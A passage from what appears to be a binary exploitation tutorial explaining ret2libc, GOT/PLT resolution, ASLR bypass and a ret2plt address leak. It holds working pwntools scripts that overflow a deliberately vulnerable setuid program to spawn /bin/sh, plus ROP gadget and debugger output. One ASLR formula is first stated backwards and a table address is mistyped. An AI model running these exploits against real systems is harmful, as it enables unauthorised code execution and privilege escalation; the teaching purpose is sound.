</span></span><span style="display:flex;"><span>0x00000000004011b8 : wait ; add byte ptr cs:<span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; add dword ptr <span style="color:#f92672">[</span>rbp - 0x3d<span style="color:#f92672">]</span>, ebx ; nop ; ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Unique gadgets found: <span style="color:#ae81ff">70</span>
</span></span></code></pre></div><p>This time we again have this instruction:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0x00000000004012d3 : pop rdi ; ret
</span></span></code></pre></div><p>We also need <code>ret</code> instruction address:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0x000000000040101a : ret
</span></span></code></pre></div><p>These instructions will be at mostly every binary so we dont need to worry about it not being in your program. Now we have <code>RDI</code> address <code>0x00000000004012d3</code> Next we need <code>/bin/sh</code> address, <code>system</code> address form where we want to call (We cant do <code>elf.sym.system</code>) like before because system function is not present in binary and finally we need <code>ret</code> (return) address which will run before system address just to fix stack misalignment.</p>
<p>Previously we got address of <code>/bin/sh</code> from libc.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; search /bin/sh
</span></span><span style="display:flex;"><span>Searching <span style="color:#66d9ef">for</span> byte: b<span style="color:#e6db74">&#39;/bin/sh&#39;</span>
</span></span><span style="display:flex;"><span>libc.so.6       0x7ffff7dcb42f 0x68732f6e69622f /* <span style="color:#e6db74">&#39;/bin/sh&#39;</span> */
</span></span></code></pre></div><p>We can see its address is <code>0x7ffff7dcb42f</code> now we need system function address. We can run program again and <code>CTRL+C</code> at when its taking input and we can use command <code>p system</code> to print system function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; p system
</span></span><span style="display:flex;"><span>$1 <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>int <span style="color:#f92672">(</span>const char *<span style="color:#f92672">)}</span> 0x7ffff7c58750 &lt;__libc_system&gt;
</span></span></code></pre></div><p>As shown above we got system function address <code>0x7ffff7c58750</code> which is of libc library and finally we need address of <code>ret</code> which we already know from above <code>ROPGadget</code> tool which is <code>0x000000000040101a</code>. Now just put it in exploit.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2libc&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004012d3</span>
</span></span><span style="display:flex;"><span>bin_sh <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dcb42f</span>
</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7c58750</span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040101a</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">40</span>) <span style="color:#f92672">+</span> pack(pop_rdi) <span style="color:#f92672">+</span> pack(bin_sh) <span style="color:#f92672">+</span> pack(ret) <span style="color:#f92672">+</span> pack(system)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="0x7---global-offset-table-got-and-procedure-linkage-table-plt">0x7 - Global Offset Table (GOT) and Procedure Linkage Table (PLT)</h2>
<p><strong>Linking</strong> is the process of combining various pieces of code and data into a single executable or library. These pieces typically come from object files (compiled source code), libraries, or other modules. Linking ensures that function calls, variable references, and symbols in a program are correctly resolved, allowing the program to execute as intended. There are two main types of linking: <strong>static linking</strong> and <strong>dynamic linking</strong>.</p>
<p>In <strong>static linking</strong>, all necessary code and libraries are included directly into the final executable at compile time, making the executable self-contained but larger in size. It also has advantage that it doesn&rsquo;t need dependency to run. For example, if you write a C program that uses the <code>printf()</code> function and compile it with static linking, the compiler includes the actual implementation of <code>printf()</code> from the C standard library directly into your program.</p>
<p>In <strong>dynamic linking</strong>, the executable contains references to shared libraries (such as <code>libc.so</code>), which are loaded into memory at runtime, reducing the executable size and enabling multiple programs to share the same library code. Dynamic linking also allows updates to shared libraries without recompiling dependent programs. For example, when your program calls <code>printf()</code>, the system resolves that call to the actual function in the loaded <code>libc.so.6</code> file. This makes the executable smaller and allows multiple programs to share the same library code, but it also means the correct library version must be available at runtime.</p>
<p>In dynamic linking when programs use <strong>shared libraries</strong>, such as <code>libc</code>, they don&rsquo;t know the exact memory address of external functions like <code>printf()</code> or <code>system()</code> at compile time and also due to ASLR protection Instead, they rely on two key tables: the <strong>Global Offset Table (GOT)</strong> and the <strong>Procedure Linkage Table (PLT)</strong> to resolve these function addresses dynamically at runtime.</p>
<p>Lets look at example of program from <code>ret2libc</code> challenge. This is small part of disassembly of main function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>   0x0000000000401245 &lt;+34&gt;:	call   0x4010b0 &lt;printf@plt&gt;
</span></span><span style="display:flex;"><span>   0x000000000040124a &lt;+39&gt;:	lea    -0x20<span style="color:#f92672">(</span>%rbp<span style="color:#f92672">)</span>,%rax
</span></span><span style="display:flex;"><span>   0x000000000040124e &lt;+43&gt;:	mov    %rax,%rdi
</span></span><span style="display:flex;"><span>   0x0000000000401251 &lt;+46&gt;:	mov    $0x0,%eax
</span></span><span style="display:flex;"><span>   0x0000000000401256 &lt;+51&gt;:	call   0x4010d0 &lt;gets@plt&gt;
</span></span></code></pre></div><p>As we can see it calls <code>printf</code> function and <code>gets</code> function but the address of it calling <code>0x4010b0</code> are same, its because its not calling different function instead its calling PLT stub, thats why we see <code>printf@plt</code> and <code>gets@plt</code> and it has fix address. <strong>Stubs</strong> short pieces of code that don‚Äôt contain the real function logic. Instead they jump indirectly to <strong>Global Offset Table (GOT)</strong>, which holds real address of external function like <code>printf</code>. This is why the PLT addresses are fixed and known at compile time, while the real function addresses in libc are unknown until runtime.</p>
<p><img src="/img/pltgot.png" alt="pltngot"></p>
<p>When the program calls <code>call 0x4010b0 &lt;printf@plt&gt;</code>, it doesn&rsquo;t directly call <code>printf()</code> in libc. It:</p>
<ol>
<li>
<p><strong>Jump to <code>printf@plt</code> (Procedure Linkage Table entry for <code>printf</code>):</strong><br>
The call instruction doesn‚Äôt jump directly to the real <code>printf</code> function in the shared library (<code>libc</code>). Instead, it jumps to a small piece of code inside the binary called the <strong>PLT stub</strong> for <code>printf</code>. This stub acts as an intermediary and is always at a fixed address in the binary.</p>
</li>
<li>
<p><strong>PLT stub jumps indirectly via the GOT entry <code>printf@got</code>:</strong><br>
Inside the PLT stub, there is an indirect jump instruction that jumps to the address stored in the <strong>Global Offset Table (GOT)</strong> entry for <code>printf</code>. The GOT is a writable table that initially holds a pointer to the dynamic linker resolver function.<br>
So, on the very first call, this pointer is not the actual address of <code>printf</code>, but rather a function that helps find it.</p>
</li>
<li>
<p><strong>If the GOT entry hasn‚Äôt been resolved yet, the PLT stub calls the dynamic linker resolver:</strong><br>
Because this is the first time <code>printf</code> is being called, the GOT entry points to the dynamic linker‚Äôs <strong>resolver function</strong>. The PLT stub triggers a call to this resolver, passing some information about which function (<code>printf</code>) needs to be resolved.</p>
</li>
<li>
<p><strong>The dynamic linker locates the real address of <code>printf()</code> in the loaded shared library:</strong><br>
The resolver function looks up <code>printf</code> inside the loaded shared libraries (such as <code>libc.so</code>), finds its actual runtime address in memory, and then <strong>writes this resolved address into the GOT entry for <code>printf</code></strong>.</p>
</li>
<li>
<p><strong>Future calls jump directly to the real <code>printf()</code> function:</strong><br>
After the GOT entry is updated with the real address of <code>printf</code>, the PLT stub‚Äôs indirect jump now points directly to <code>printf</code> in libc. This means all subsequent calls to <code>printf@plt</code> skip the resolver step and jump straight to the real function, making the call faster.</p>
</li>
</ol>
<p>So in <strong>summary</strong> When we call a function, the process is the same every time except for the very first call. The first time the function is called, it takes longer because the program needs to find the actual address of the function in the shared library. During this initial call, the function address is resolved and then stored in the <strong>Global Offset Table (GOT)</strong>. On subsequent calls, instead of resolving again, the program jumps directly to the stored address in the GOT via the Procedure Linkage Table (PLT), making the calls faster. The <strong>PLT</strong> is a special section in a program‚Äôs binary that acts like a <strong>jump table</strong> or <strong>trampoline</strong> for calling external functions (usually from shared libraries like libc).</p>
<h1 id="0x8---aslr-and-its-bypass">0x8 - ASLR and Its Bypass</h1>
<p>We already know about ASLR from Stack Overflow protection section. Consider <code>0x7f42e3304000</code> base address of program we know that base address is randomized. If we want to find address of certain function we first need to find how much far is it from our base address. Like in down table <code>puts</code> function is <code>0x4</code> bytes far from base address, <code>system</code> function is <code>0x9</code> bytes far from base address and so on. We can easily find how much far is function from base address using tools like <code>readelf</code>, <code>nm</code>, <code>ROPgadget</code> etc which will be covered later. After adding the base address with offset value we can get our final address of function.</p>
<table>
  <thead>
      <tr>
          <th></th>
          <th><code>0x7f42e3304000</code></th>
          <th>LIBC</th>
          <th></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Bytes</td>
          <td>Functions</td>
          <td>Address Computation</td>
          <td>Address</td>
      </tr>
      <tr>
          <td><code>0x4</code></td>
          <td><code>puts</code></td>
          <td><code>0x7f42e3304000+0x4</code></td>
          <td><code>0x7f42e3304004</code></td>
      </tr>
      <tr>
          <td><code>0x9</code></td>
          <td><code>system</code></td>
          <td><code>0x7f42e3304000+0x9</code></td>
          <td><code>0x7f42e3304009</code></td>
      </tr>
      <tr>
          <td><code>0x10</code></td>
          <td><code>printf</code></td>
          <td><code>0x7f42e3304000+0x10</code></td>
          <td><code>0x7f42e3304010</code></td>
      </tr>
      <tr>
          <td><code>0x18</code></td>
          <td><code>gets</code></td>
          <td><code>0x7f42e3304000+0x18</code></td>
          <td><code>0x7f42e330418</code></td>
      </tr>
  </tbody>
</table>
<p>Formula will be like this:</p>
<p>Base Address = Offset from Base Address - Randomized Address</p>
<p>Base Address means Starting Address, Offset means distance from Base Addresss here</p>
<p>As we can see its not really Randomized Address, Only Base Address is randomized. Now lets talk about how to bypass ASLR. So the main thing we want is Base Address because if we got Base Address we can get Offset easily using tools.</p>
<p>From above formula if we modify it we can write it like this:</p>
<p>Base Address =  Randomized Address - Offset from Base Address</p>
<p>Like this we can get Base Address of Region.</p>
<h2 id="0x9---ret2plt">0x9 - Ret2PLT</h2>
<p>This is a technique of implementation of ASLR bypass. Ret2PLT is only meant for bypassing ASLR so it wont be able to give us shell, So we will chain up any other technique with it to get shell. We will be combining <code>Ret2PLT</code> to bypass ASLR and <code>Ret2Libc</code> to get shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">gid_t</span> gid;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uid_t</span> uid;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  gid <span style="color:#f92672">=</span> <span style="color:#a6e22e">getegid</span>();
</span></span><span style="display:flex;"><span>  uid <span style="color:#f92672">=</span> <span style="color:#a6e22e">geteuid</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setresgid</span>(gid, gid, gid);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setresuid</span>(uid, uid, uid);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">init</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buff[<span style="color:#ae81ff">30</span>];
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Enter Data - &#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">gets</span>(buff);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>gcc ret2plt.c -o ret2plt -no-pie -fno-stack-protector</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ls -la ret2plt         
</span></span><span style="display:flex;"><span>-rwsr-sr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">16920</span> Jun <span style="color:#ae81ff">26</span> 17:03 ret2plt
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ checksec --file<span style="color:#f92672">=</span>ret2plt --format<span style="color:#f92672">=</span>json
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span> <span style="color:#e6db74">&#34;ret2plt&#34;</span>: <span style="color:#f92672">{</span> <span style="color:#e6db74">&#34;relro&#34;</span>:<span style="color:#e6db74">&#34;partial&#34;</span>,<span style="color:#e6db74">&#34;canary&#34;</span>:<span style="color:#e6db74">&#34;no&#34;</span>,<span style="color:#e6db74">&#34;nx&#34;</span>:<span style="color:#e6db74">&#34;yes&#34;</span>,<span style="color:#e6db74">&#34;pie&#34;</span>:<span style="color:#e6db74">&#34;no&#34;</span>,<span style="color:#e6db74">&#34;rpath&#34;</span>:<span style="color:#e6db74">&#34;no&#34;</span>,<span style="color:#e6db74">&#34;runpath&#34;</span>:<span style="color:#e6db74">&#34;no&#34;</span>,<span style="color:#e6db74">&#34;symbols&#34;</span>:<span style="color:#e6db74">&#34;yes&#34;</span>,<span style="color:#e6db74">&#34;fortify_source&#34;</span>:<span style="color:#e6db74">&#34;no&#34;</span>,<span style="color:#e6db74">&#34;fortified&#34;</span>:<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#e6db74">&#34;fortify-able&#34;</span>:<span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#f92672">}</span> <span style="color:#f92672">}</span>
</span></span></code></pre></div><p>Since there is no canary enabled we can perform buffer overflow and there is NX enabled it means we can&rsquo;t perform <code>Ret2Shellcode</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./ret2plt         
</span></span><span style="display:flex;"><span>Enter Data - 
</span></span><span style="display:flex;"><span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>    <span style="color:#ae81ff">5655</span> segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>  ./ret2plt
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>pwndbg&gt; info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non-debugging symbols:
</span></span><span style="display:flex;"><span>0x0000000000401000  _init
</span></span><span style="display:flex;"><span>0x0000000000401090  puts@plt
</span></span><span style="display:flex;"><span>0x00000000004010a0  setresuid@plt
</span></span><span style="display:flex;"><span>0x00000000004010b0  setresgid@plt
</span></span><span style="display:flex;"><span>0x00000000004010c0  geteuid@plt
</span></span><span style="display:flex;"><span>0x00000000004010d0  gets@plt
</span></span><span style="display:flex;"><span>0x00000000004010e0  getegid@plt
</span></span><span style="display:flex;"><span>0x00000000004010f0  _start
</span></span><span style="display:flex;"><span>0x0000000000401120  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span>0x0000000000401130  deregister_tm_clones
</span></span><span style="display:flex;"><span>0x0000000000401160  register_tm_clones
</span></span><span style="display:flex;"><span>0x00000000004011a0  __do_global_dtors_aux
</span></span><span style="display:flex;"><span>0x00000000004011d0  frame_dummy
</span></span><span style="display:flex;"><span>0x00000000004011d6  init
</span></span><span style="display:flex;"><span>0x0000000000401223  main
</span></span><span style="display:flex;"><span>0x0000000000401260  __libc_csu_init
</span></span><span style="display:flex;"><span>0x00000000004012d0  __libc_csu_fini
</span></span><span style="display:flex;"><span>0x00000000004012d8  _fini
</span></span></code></pre></div><p>First find offset at which overflow occurs, I have already did it and got offset of <code>40</code>. To bypass ASLR we first need to leak Randomized Address because if we got Randomized Address we can get or Base Address as as we said in previous section. We can leak it using <code>Ret2PLT</code>.</p>
<p>We first need to find function Randomized Address and it is stored in <code>GOT</code>. Run the program and during input section press <code>CTRL+C</code> so program wont quit, We did this in previous attacks so next time i wont say this.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; r
</span></span><span style="display:flex;"><span>Starting program: /home/at0m/ret2plt 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Thread debugging using libthread_db enabled<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Using host libthread_db library <span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;</span>.
</span></span><span style="display:flex;"><span>Enter Data - 
</span></span><span style="display:flex;"><span>^C
</span></span></code></pre></div><p>Now use <code>got</code> command to get address.</p>
<p><img src="/img/got.png" alt="got.png"></p>
<p>We can see that we got Randomized Address. <code>So, We just print it ?</code> No since its Randomized Address if we run program again it will be changed thats why we need to somehow leak this address at runtime and use it to calculate the base address of loaded libc. We can use function like <code>puts@GLIBC</code> to print content of GOT entry, for example <code>puts@GLIBC</code> which will reveal the actual memory address of <code>puts</code> function in libc during execution. Once we have leaked address, we can compute the libc base by subtracting the known offset of <code>puts</code> from the leaked address. Then, using this base, we can locate other useful libc functions like <code>system</code>, and strings like <code>&quot;/bin/sh&quot;</code>, to craft a second-stage payload and gain shell access.</p>
<p>We also need <code>rdi</code> address as <code>puts</code> function takes arguments, the first argument to function is passed on <code>rdi</code> register, the second in <code>rsi</code>, third in <code>rdx</code> and so on. So, when we want to call:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>)
</span></span></code></pre></div><p>We need to make sure that <code>rdi</code> points to address of string <code>&quot;bin/sh&quot;</code> and also that the instruction pointer (RIP) is set to the address of <code>system</code>.</p>
<p>Like previously we can run ROPgadget and get the address of <code>rdi</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ROPgadget --binary ret2plt 
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span><span style="display:flex;"><span>0x00000000004012c3 : pop rdi ; ret
</span></span><span style="display:flex;"><span>0x00000000004012c1 : pop rsi ; pop r15 ; ret
</span></span><span style="display:flex;"><span>0x00000000004012bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span>0x000000000040101a : ret
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span></code></pre></div><p>We found a <code>pop rdi ; ret</code> gadget at <code>0x00000000004012c3</code>. This is crucial for placing a value (such as the address of a string like <code>&quot;/bin/sh&quot;</code>) into the <code>rdi</code> register, which is required for setting up the first argument to functions like <code>puts</code> or <code>system</code>. We also identified a standalone <code>ret</code> gadget at <code>0x000000000040101a</code>, which is optional but useful. It&rsquo;s commonly used to fix stack alignment issues (especially when calling functions through libc with certain ABI constraints).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0x00000000004012c3 : pop rdi ; ret
</span></span></code></pre></div><p>The <code>ret</code> at the end of this gadget ensures the code can continue executing by returning to the next address on the stack, typically the function we&rsquo;re trying to call (e.g., <code>puts@plt</code>). Without this, control flow would break. Using these gadgets allows us to build a reliable ROP chain for further exploitation.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2plt&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004012c3</span>
</span></span><span style="display:flex;"><span>puts <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>puts
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">40</span>) <span style="color:#f92672">+</span> pack(pop_rdi) <span style="color:#f92672">+</span> pack(elf<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>puts) <span style="color:#f92672">+</span> pack(puts) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>If we run this incomplete exploit now.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ python3 main.py
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/at0m/ret2plt&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:      Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:      No canary found
</span></span><span style="display:flex;"><span>    NX:         NX enabled
</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    SHSTK:      Enabled
</span></span><span style="display:flex;"><span>    IBT:        Enabled
</span></span><span style="display:flex;"><span>    Stripped:   No
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;/home/at0m/ret2plt&#39;</span>: pid <span style="color:#ae81ff">7842</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span>Enter Data - 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\x</span>e0<span style="color:#f92672">{</span><span style="color:#ae81ff">\x</span>08∆®s
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got EOF <span style="color:#66d9ef">while</span> reading in interactive
</span></span></code></pre></div><p>We can see now we got <code>\xe0{\x08∆®s</code>, We got our leaked address but this is in little-endian format thats why is weird and terminal can&rsquo;t display properly. If we run it again we will get different address because its random, We first need to print leaked address in hex format or integer format.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2plt&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004012c3</span>
</span></span><span style="display:flex;"><span>puts <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>puts
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">40</span>) <span style="color:#f92672">+</span> pack(pop_rdi) <span style="color:#f92672">+</span> pack(elf<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>puts) <span style="color:#f92672">+</span> pack(puts) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(io<span style="color:#f92672">.</span>recvall())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ python3 main.py
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/at0m/ret2plt&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:      Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:      No canary found
</span></span><span style="display:flex;"><span>    NX:         NX enabled
</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    SHSTK:      Enabled
</span></span><span style="display:flex;"><span>    IBT:        Enabled
</span></span><span style="display:flex;"><span>    Stripped:   No
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;/home/at0m/ret2plt&#39;</span>: pid <span style="color:#ae81ff">8646</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Receiving all data: Done <span style="color:#f92672">(</span>21B<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Process <span style="color:#e6db74">&#39;/home/at0m/ret2plt&#39;</span> stopped with exit code -11 <span style="color:#f92672">(</span>SIGSEGV<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>pid 8646<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Data - \n\xe0{\x88\xddHr\n&#39;</span>
